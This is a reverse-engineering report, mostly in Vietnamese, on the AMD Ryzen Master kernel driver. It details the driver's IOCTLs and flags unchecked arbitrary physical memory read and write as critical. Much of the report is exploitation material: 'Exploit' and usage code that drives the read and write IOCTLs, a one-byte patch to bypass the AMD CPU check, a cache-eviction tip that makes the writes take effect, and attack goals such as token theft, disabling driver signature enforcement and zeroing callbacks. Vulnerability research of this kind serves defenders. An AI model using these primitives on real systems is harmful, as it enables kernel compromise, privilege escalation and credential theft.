# AMDRyzenMasterDriver.sys — Full Reverse Engineering Report
> Reversed via IDA Pro idalib | Image base: `0x140000000` | All RVAs = VA − 0x140000000

---

## 1. File Identity

| Field            | Value |
|------------------|-------|
| Filename         | AMDRyzenMasterDriver.sys |
| SHA-256          | `77955AF8A8BCEA8998F4046C2F8534F6FB1959C71DE049CA2F4298BA47D8F23A` |
| MD5              | `067166E788DA08B77219430484563388` |
| Size             | 48,328 bytes |
| File version     | 2.0.0.0 |
| Build timestamp  | 2025-12-12 05:12:30 UTC |
| Signer           | Advanced Micro Devices Inc. (Authenticode valid) |
| Distributed via  | AMD Adrenalin Software 26.1.1 / VGA driver pkg V31.0.21924.61 (Apr 2026) |
| Service name     | AMDRyzenMasterDriverV20 |
| Start type       | SERVICE_AUTO_START (0x2) — runs on every boot |

---

## 2. Cách Mở Driver

### 2.1 Tên thiết bị

| Type            | Path |
|-----------------|------|
| NT device name  | `\Device\AMDRyzenMasterDriverV20` |
| DOS/Win32 path  | `\DosDevices\AMDRyzenMasterDriverV20` — accessible as `\\.\AMDRyzenMasterDriverV20` |

**Confirmed từ bytes tại RVA 0x6000 / 0x6040:**
```
RVA 0x6000: 5C 00 44 00 65 00 76 00 69 00 63 00 65 00 5C 00   \Device\
            41 00 4D 00 44 00 52 00 79 00 7A 00 65 00 6E 00   AMDRyzen
            4D 00 61 00 73 00 74 00 65 00 72 00 44 00 72 00   MasterDr
            69 00 76 00 65 00 72 00 56 00 32 00 30 00 00 00   iverV20\0

RVA 0x6040: \DosDevices\AMDRyzenMasterDriverV20
```

### 2.2 Security Descriptor (SDDL)

```
D:P(A;;GW;;;BA)(A;;GR;;;BA)
```
- `BA` = BUILTIN\Administrators — **chỉ Admin mới mở được**
- `GW` = GENERIC_WRITE access granted
- `GR` = GENERIC_READ access granted
- Không có entry cho Users/Everyone

SDDL string tại RVA `0x3610`.  
Được set qua `IoCreateDevice` + `ZwSetSecurityObject` tại RVA `0x1D24` (sub_140001D24).

### 2.3 Code mở device

```c
HANDLE hDriver = CreateFileW(
    L"\\\\.\\AMDRyzenMasterDriverV20",
    GENERIC_READ | GENERIC_WRITE,
    0,                    // no sharing
    NULL,
    OPEN_EXISTING,
    0,
    NULL
);
// Yêu cầu: Administrator token
// Không cần SeLoadDriverPrivilege
// Không có process whitelist — bất kỳ Admin process nào cũng được
```

### 2.4 Transfer method

Tất cả IOCTL dùng `METHOD_BUFFERED` (bits 1:0 = 0). I/O Manager tự copy input/output buffer.  
`DeviceType` = `0x8111` (non-standard, AMD-specific).

---

## 3. Luồng DriverEntry

```
RVA 0x2BF0  DriverEntry (PE entry point)
 └─ RVA 0x2C1C  sub_140002C1C  (WDF init wrapper)
     ├─ WdfVersionBind()              ← bind to KMDF framework
     ├─ RVA 0x2E68  sub_140002E68    ← KMDF type init
     ├─ RVA 0x2DB0  sub_140002DB0    ← KMDF class bind
     └─ RVA 0x1D24  sub_140001D24    ← REAL driver init
         ├─ RVA 0x212C  sub_14000212C  ← [CHECK 1] CPUID AMD verify
         │   cpuid leaf=0 → build 12-byte vendor string
         │   strncmp(vendor, "AuthenticAMD", 0x100)
         │   Fail → return 0xC0000001 (STATUS_UNSUCCESSFUL)
         │   "AuthenticAMD" string @ RVA 0x35D0
         │
         ├─ IoCreateDevice(DevType=0x8111, DevName=\Device\AMDRyzenMasterDriverV20)
         ├─ IoCreateSymbolicLink(\DosDevices\..., \Device\...)
         ├─ IoDeleteSymbolicLink on failure
         ├─ DriverObject->MajorFunction[IRP_MJ_CREATE]         = RVA 0x1000
         ├─ DriverObject->MajorFunction[IRP_MJ_CLOSE]          = RVA 0x1000
         ├─ DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RVA 0x1000
         └─ RVA 0x221C  sub_14000221C  ← DriverInit flag check (logging only)
```

---

## 4. Access Checks — Tổng hợp

| Check | RVA | Loại | Bypass |
|-------|-----|------|--------|
| CPUID "AuthenticAMD" | 0x212C | Hard gate — fail → driver không load | Patch 1 byte tại 0x1D53: `75`→`EB` |
| SDDL BA only | DACL trên device object | OS enforces — non-admin nhận ACCESS_DENIED | Cần Admin token |
| Process whitelist | **Không có** | — | N/A |
| Session log | RVA 0x10F7 (IRP_MJ_CREATE) | Chỉ log PID + ImageFileName, không block | Không cần bypass |
| Input buffer size | Per-IOCTL | Kiểm tra trước mỗi dispatch | Đáp ứng min size là qua |
| PA range validation | **Không có** | ← LỖ HỔNG CHÍNH | N/A |

**CPUID check bypass (không patch file):**
```
Patch in-memory tại VA (image_base + 0x1D53):
  75 0A  →  EB 0A   (jnz → jmp, 1 byte)
```

---

## 5. IRP Dispatch Handler — RVA 0x1000

Handler `sub_140001000` xử lý 3 IRP types:
- `IRP_MJ_CREATE` (code 0x0): log session, allow all
- `IRP_MJ_CLOSE`  (code 0x2): remove session từ list
- `IRP_MJ_DEVICE_CONTROL` (code 0xE): IOCTL dispatch

**Session tracking** (IRP_MJ_CREATE, RVA 0x10F7):
```c
struct session_entry {        // ExAllocatePoolWithTag, tag 0x54616734 ("Tag4")
    DWORD  pid;               // +0x00  PsGetCurrentProcessId
    char   name[64];          // +0x04  PsGetProcessImageFileName
    QWORD  next;              // +0x48  linked list → qword @ RVA 0x6370
};
// Không block ai — chỉ ghi log
```

---

## 6. Bảng IOCTL Đầy Đủ

| IOCTL Code   | Function Code | RVA Case Handler | Tên | Nguy hiểm? |
|--------------|---------------|-----------------|-----|------------|
| `0x81112EE0` | 0xBB8 | `0x13C4` | MSR READ (allowlist) | Trung bình |
| `0x81112EE4` | 0xBB9 | `0x1486` | MSR WRITE (allowlist) | Trung bình |
| `0x81112EF8` | 0xBBE | `0x1645` | PCI READ via HAL (no offset limit) | Thấp |
| **`0x81112F08`** | **0xBC2** | **`0x155B`** | **Arbitrary PHYS READ** | **🔴 CRITICAL** |
| **`0x81112F0C`** | **0xBC3** | **`0x15D5`** | **Arbitrary PHYS WRITE** | **🔴 CRITICAL** |
| `0x81112F18` | 0xBC6 | `0x170D` | CPU info enum | Thấp |
| `0x81112F20` | 0xBC8 | `0x1860` | MPERF/APERF ratio | Thấp |
| `0x81112F24` | 0xBC9 | `0x1AD7` | PCI READ variant (no offset limit) | Thấp |
| `0x81112FF8` | 0xBFE | `0x19B4` | SMU mailbox WRITE (offset < 0x100) | Trung bình |
| `0x81112FFC` | 0xBFF | `0x1B4B` | Session list query | Thấp |
| `0x81113000` | 0xC00 | `0x1C94` | Driver version | Thấp |

---

## 7. Phân Tích Chi Tiết Từng IOCTL

---

### 7.1 IOCTL 0x81112F08 — Arbitrary Physical READ 🔴

**Handler RVA:** `0x155B`  
**Primitive function RVA:** `0x23F8` (`phys_read`)

**Input buffer (12 bytes):**
```c
struct PhysReadIn {
    UINT64 PhysAddr;   // +0x00  địa chỉ vật lý bất kỳ
    UINT32 Size;       // +0x08  số bytes cần đọc
};
```

**Output buffer (12 + Size bytes):**
```c
struct PhysReadOut {
    UINT64 PhysAddr;   // +0x00  echo lại
    UINT32 Size;       // +0x08  echo lại
    BYTE   Data[Size]; // +0x0C  dữ liệu đọc về
};
```

**Dispatch check (RVA 0x155B):**
```c
// Input: v14 = InBufferSize, v12 = OutBufferSize, v16 = InBuffer ptr
if ( v14 >= 0xC && v12 >= (uint32)v16[2] + 12 ) {
    _mm_lfence();
    phys_read(*(PHYSICAL_ADDRESS*)v16, v16[2], (BYTE*)v16 + 12);
}
// KHÔNG có PA range check
// KHÔNG có size limit
```

**phys_read implementation (RVA 0x23F8):**
```c
char phys_read(PHYSICAL_ADDRESS pa, UINT32 size, BYTE *out) {
    BYTE *va = MmMapIoSpace(pa, size, MmNonCached);  // UC mapping
    if (!va) return 0;                                // NULL-safe
    switch (size) {
        case 1: *out             = *va;           break;
        case 2: *(UINT16*)out    = *(UINT16*)va;  break;
        case 4: *(UINT32*)out    = *(UINT32*)va;  break;
        case 8: *(UINT64*)out    = *(UINT64*)va;  break;
        default:
            for (UINT32 i = 0; i < size; i++) out[i] = va[i];
    }
    MmUnmapIoSpace(va, size);
    return 1;
}
// Calls to MmMapIoSpace @ RVA 0x2438 (import thunk 0x4090)
// Calls to MmUnmapIoSpace @ RVA 0x2506 (import thunk 0x4098)
```

**Exploit:**
```c
// Đọc 8 bytes từ địa chỉ vật lý 0x1000 (low stub)
struct { UINT64 pa; UINT32 sz; } req = { 0x1000, 8 };
BYTE out[20]; DWORD returned;
DeviceIoControl(hDrv, 0x81112F08, &req, 12, out, 20, &returned, NULL);
// out+12 chứa 8 bytes từ PA 0x1000
```

---

### 7.2 IOCTL 0x81112F0C — Arbitrary Physical WRITE 🔴

**Handler RVA:** `0x15D5`  
**Primitive function RVA:** `0x2848` (`phys_write`)

**Input buffer (12 + Size bytes):**
```c
struct PhysWriteIn {
    UINT64 PhysAddr;   // +0x00  địa chỉ vật lý bất kỳ
    UINT32 Size;       // +0x08  số bytes cần ghi
    BYTE   Data[Size]; // +0x0C  data cần ghi
};
```

**Dispatch check (RVA 0x15D5):**
```c
if ( v14 >= (uint32)v16[2] + 12 ) {   // chỉ check input đủ dài
    _mm_lfence();
    phys_write(*(PHYSICAL_ADDRESS*)v16, v16[2], (BYTE*)(v16 + 3));
}
// KHÔNG có PA range check
// KHÔNG có size limit
// KHÔNG có output buffer (write-only)
```

**phys_write implementation (RVA 0x2848):**
```c
char phys_write(PHYSICAL_ADDRESS pa, UINT32 size, BYTE *data) {
    BYTE *va = MmMapIoSpace(pa, size, MmNonCached);  // UC mapping
    if (!va) return 0;
    for (UINT32 i = 0; i < size; i++) va[i] = data[i];  // byte loop
    MmUnmapIoSpace(va, size);
    return 1;
}
```

**⚠ Lưu ý UC write:** Vì dùng `MmNonCached` (Uncacheable), CPU cache không được update.
Kernel đọc từ cache → thấy giá trị cũ. Cần cache eviction để kernel thấy write.  
**Cách evict:** Allocate + read ~512 MB RAM để flush L3, hoặc dùng `CLFLUSH` nếu có VA.

**Exploit:**
```c
// Ghi 8 bytes vào PA tùy ý
BYTE payload[20];
*(UINT64*)&payload[0] = target_pa;
*(UINT32*)&payload[8] = 8;
*(UINT64*)&payload[12] = new_value;
DeviceIoControl(hDrv, 0x81112F0C, payload, 20, NULL, 0, &ret, NULL);
```

---

### 7.3 IOCTL 0x81112EE0 — MSR READ

**Handler RVA:** `0x13C4`

**Input (12 bytes):** `{ int index; UINT64 unused; }`  
**Output (12 bytes):** `{ int index; UINT64 value; }`

**Check:**
```c
if ( v14 >= 0xC && v12 >= 0xC && *v16 < 19 ) {  // index 0–18
    _mm_lfence();
    *(UINT64*)(v16+1) = __readmsr(dword_140006090[*v16]);
}
```

**MSR allowlist tại RVA 0x6090 (19 entries):**

| Idx | MSR | Name |
|-----|-----|------|
| 0  | `0xC0010062` | MSRC001_0062 — HW_PSTATE_STATUS |
| 1  | `0xC0010063` | MSRC001_0063 — CUR_PSTATE |
| 2  | `0xC0010061` | MSRC001_0061 — PSTATE_CURRENT_LIMIT |
| 3  | `0xC0010064` | MSRC001_0064 — PSTATE_DEF_0 |
| 4  | `0xC0010065` | MSRC001_0065 — PSTATE_DEF_1 |
| 5  | `0xC0010066` | MSRC001_0066 — PSTATE_DEF_2 |
| 6  | `0xC0010067` | MSRC001_0067 — PSTATE_DEF_3 |
| 7  | `0xC0010068` | MSRC001_0068 — PSTATE_DEF_4 |
| 8  | `0xC0010015` | MSRC001_0015 — HWCR (Hardware Config) |
| 9  | `0x000000E7` | IA32_MPERF |
| 10 | `0x000000E8` | IA32_APERF |
| 11 | `0xC0010290` | IBS_FETCH_CTL |
| 12 | `0xC0010292` | IBS_OP_CTL |
| 13 | `0xC0010293` | IBS_OP_DATA |
| 14 | `0x0000008B` | IA32_BIOS_SIGN_ID (microcode version) |
| 15 | `0xC00102B0` | SMU/NB power mgmt |
| 16 | `0xC00102B1` | SMU/NB |
| 17 | `0xC00102B3` | SMU/NB |
| 18 | `0xC00102B4` | SMU/NB |

**⚠ Đáng chú ý:** HWCR (idx 8) có thể đọc/ghi hardware config.  
LSTAR/EFER/SYSENTER **không có trong allowlist**.

---

### 7.4 IOCTL 0x81112EE4 — MSR WRITE

**Handler RVA:** `0x1486`

**Input (12 bytes):** `{ int index; UINT32 lo; UINT32 hi; }`

**Check:**
```c
if ( v14 >= 0xC && *v16 < 19 ) {   // index 0–18, không check OutBufSize
    _mm_lfence();
    UINT64 val = (UINT64)v16[2] << 32 | (UINT32)v16[1];
    __writemsr(dword_140006090[*v16], val);
}
```

**⚠ Có thể ghi HWCR:** `index=8` → write MSR `0xC0010015`.  
HWCR bits: SMM lock, microcode patch disable, interrupt masking. Có thể gây instability.

---

### 7.5 IOCTL 0x81112EF8 — PCI READ (HalGetBusDataByOffset)

**Handler RVA:** `0x1645`  
**HAL function RVA:** `0x28FC` (sub_1400028FC)

**Input (20+ bytes):**
```c
struct PciReadIn {
    UINT32 Bus;          // +0x00
    UINT32 Device;       // +0x04  masked & 0x1F
    UINT32 Function;     // +0x08  masked & 0x7
    UINT32 Offset;       // +0x0C
    UINT32 Size;         // +0x10
    // output appended at +0x14
};
```

**Check:**
```c
if ( v14 >= 0x14 && v12 >= (uint32)v16[4] + 20 ) {
    HalGetBusDataByOffset(PCIConfiguration /*4*/,
                          v16[0] /*bus*/,
                          (v16[2] & 7) << 5 | v16[1] & 0x1F,  // SlotNumber
                          v16+5 /*out buffer*/,
                          v16[3] /*offset*/,
                          v16[4] /*length*/);
}
// Không có offset < 0x100 check → có thể đọc extended config space
```

---

### 7.6 IOCTL 0x81112F24 — PCI READ Variant

**Handler RVA:** `0x1AD7`

**Input (20+ bytes):** tương tự 0x81112EF8  
**Extra check:** `v16[0] < dword_1400065E8` (bus index < max_bus_count)

**⚠ Không có offset limit** — có thể đọc toàn bộ PCI extended config space.

---

### 7.7 IOCTL 0x81112FF8 — SMU Mailbox WRITE

**Handler RVA:** `0x19B4`  
**Lookup function RVA:** `0x2274` (sub_140002274)  
**Write function RVA:** `0x27D4` → `0x2988` (sub_140002988)

**Input (18 bytes):**
```c
struct SmuWriteIn {
    UINT16 unknown0;    // +0x00
    UINT8  reg_type;    // +0x02  must be < 2
    UINT8  pad;         // +0x03
    UINT16 dev;         // +0x04
    UINT16 func;        // +0x06
    UINT32 data;        // +0x08 (dword at offset 2 of struct in caller)
    UINT16 offset;      // +0x0C
    UINT16 length;      // +0x0E
    // ...
};
```

**Check:**
```c
if ( v14 >= 0x12 && *(UINT8*)(v16+2) < 2 ) {
    // lookup bus number from internal CPU table
    // then: HalSetBusDataByOffset(PCIConfiguration, bus, slot, data, offset, size)
    // HARD LIMIT: offset must be < 0x100 (standard PCI config space only)
}
// offset < 0x100 → KHÔNG access extended PCI config (unlike EF8/F24)
```

---

### 7.8 IOCTL 0x81112F18 — CPU Info Enum

**Handler RVA:** `0x170D`

**Input/Output (28+ bytes):**
```c
// Input[6] == 0 → write count, return
// Input[6] != 0 → fill array of CPU descriptors
// Mỗi entry 52 bytes, count = dword @ RVA 0x65EC
```

**Thấp nguy hiểm** — chỉ đọc internal CPU topology table.

---

### 7.9 IOCTL 0x81112F20 — MPERF/APERF Ratio

**Handler RVA:** `0x1860`

**Output (8 bytes):** `{ double freq_ratio; }`

Ghi MSR IA32_MPERF=0, IA32_APERF=0, sleep 10ms, đọc lại → tính ratio.  
**Không nguy hiểm** — readonly telemetry.

---

### 7.10 IOCTL 0x81112FFC — Session List Query

**Handler RVA:** `0x1B4B`

**Input:** `{ UINT32 count; }` (= 0 → trả về tổng số sessions)  
**Output:** array of `{ UINT32 pid; char name[64]; }` per session

Leak danh sách PID + tên của tất cả process đang giữ handle đến driver.  
**Thấp nguy hiểm** nhưng useful cho recon.

---

### 7.11 IOCTL 0x81113000 — Driver Version

**Handler RVA:** `0x1C94`

```c
*v16 = 20;   // hardcoded: returns integer 20 (version "V20")
```

---

## 8. Hàm Helper Quan Trọng

| RVA | Tên | Mô tả |
|-----|-----|-------|
| `0x23F8` | `phys_read` | MmMapIoSpace UC read, switch(1/2/4/8/default) |
| `0x2848` | `phys_write` | MmMapIoSpace UC write, byte loop |
| `0x28FC` | `pci_hal_read` | HalGetBusDataByOffset wrapper, no offset limit |
| `0x2988` | `pci_hal_write` | HalSetBusDataByOffset wrapper, offset < 0x100 |
| `0x2274` | `smu_bus_lookup` | Tìm bus number từ CPU table (P @ RVA 0x65F0) |
| `0x2384` | `pci_read_wrapper` | Wrapper gọi sub_1400028FC |
| `0x27D4` | `pci_write_wrapper` | Wrapper gọi sub_140002988 |
| `0x212C` | `cpuid_check` | CPUID leaf 0 → "AuthenticAMD" strcmp |
| `0x210C` | `get_pid` | PsGetCurrentProcessId wrapper |
| `0x1FBC` | `init_helper` | NtQuerySystemInformation resolver + OS version detect |
| `0x221C` | `driver_init_check` | Kiểm tra một flag, kết quả chỉ dùng cho logging |
| `0x1D24` | `driver_init` | Tạo device, set SDDL, set MajorFunction |
| `0x1F5C` | `pool_alloc` | ExAllocatePoolWithTag wrapper |

---

## 9. Bảng Danger Rating

| IOCTL | Primitive | Validation | Rating | Attack Scenario |
|-------|-----------|------------|--------|-----------------|
| `0x81112F0C` | Arbitrary PA write | **None** | 🔴 CRITICAL | Kernel token theft, DSE disable, callback zeroing, PTE flip |
| `0x81112F08` | Arbitrary PA read | **None** | 🔴 CRITICAL | Kernel struct leak, credential dump, CR3/PML4 walk |
| `0x81112EE4` | MSR write (19 MSRs) | Index 0–18 | 🟠 HIGH | HWCR modify, P-state manipulation |
| `0x81112EE0` | MSR read (19 MSRs) | Index 0–18 | 🟡 MEDIUM | Microcode version leak, perf counters |
| `0x81112EF8` | PCI config read | No offset limit | 🟡 MEDIUM | Extended PCI config space read |
| `0x81112F24` | PCI config read | No offset limit | 🟡 MEDIUM | Same as EF8, extra bus count check |
| `0x81112FF8` | PCI config write | offset < 0x100 | 🟡 MEDIUM | Standard PCI config space write |
| `0x81112F18` | CPU info read | Size checks | 🟢 LOW | CPU topology enumeration |
| `0x81112F20` | MPERF/APERF ratio | Size check | 🟢 LOW | Read-only performance counter |
| `0x81112FFC` | Session list read | Size check | 🟢 LOW | PID + name info leak |
| `0x81113000` | Version query | None needed | 🟢 LOW | Returns hardcoded 20 |

---

## 10. Conditions để Exploit thành công

```
1. [AMD CPU]   → DriverEntry pass CPUID check     (hoặc patch/VM bypass)
2. [Admin]     → SDDL BA only → cần token Admin
3. [AUTO_START]→ Driver luôn running, không cần sc start
4. [No PList]  → Không có process whitelist → bất kỳ Admin process nào
5. [UC writes] → Sau mỗi phys_write: cần cache eviction (flush ~512MB RAM)
                 để kernel thấy giá trị mới
```

---

## 11. Primitive Usage Examples

### Đọc arbitrary PA
```c
// Minimum input: 12 bytes, output: 12 + size bytes
#pragma pack(1)
struct PhysReadReq { UINT64 pa; UINT32 sz; };
struct PhysReadRsp { UINT64 pa; UINT32 sz; BYTE data[]; };

BYTE buf[4096];
PhysReadReq req = { target_pa, read_size };
DeviceIoControl(hDrv, 0x81112F08, &req, 12,
                buf, 12 + read_size, &ret, NULL);
// Data at buf + 12
```

### Ghi arbitrary PA
```c
struct PhysWriteReq {
    UINT64 pa;
    UINT32 sz;
    BYTE   data[write_size];
};
// Total input size = 12 + write_size
// No output buffer needed
DeviceIoControl(hDrv, 0x81112F0C, &req, 12 + write_size,
                NULL, 0, &ret, NULL);
// Sau đó evict cache!
```

### Kiểm tra driver còn running
```c
DWORD ver = 0;
DeviceIoControl(hDrv, 0x81113000, &ver, 4, &ver, 4, &ret, NULL);
// ver == 20 → driver V20 đang running
```

---

## 12. String & Data References

| RVA | Nội dung |
|-----|----------|
| `0x6000` | L"\Device\AMDRyzenMasterDriverV20" (UTF-16LE) |
| `0x6040` | L"\DosDevices\AMDRyzenMasterDriverV20" (UTF-16LE) |
| `0x3610` | L"D:P(A;;GW;;;BA)(A;;GR;;;BA)" (SDDL string) |
| `0x35D0` | "AuthenticAMD" (CPUID vendor comparison) |
| `0x6090` | MSR allowlist array, 19 × DWORD |
| `0x6370` | Session linked list head pointer |
| `0x65D8` | DriverObject pointer (saved at init) |
| `0x65E8` | max_bus_count (used by IOCTL 0x81112F24) |
| `0x65EC` | CPU count (used by IOCTL 0x81112F18) |
| `0x65F0` | CPU info table base pointer (P) |

---

*Reversed: 2026-06-03 | IDA Pro idalib session `amd_ryzen` | Image base 0x140000000*
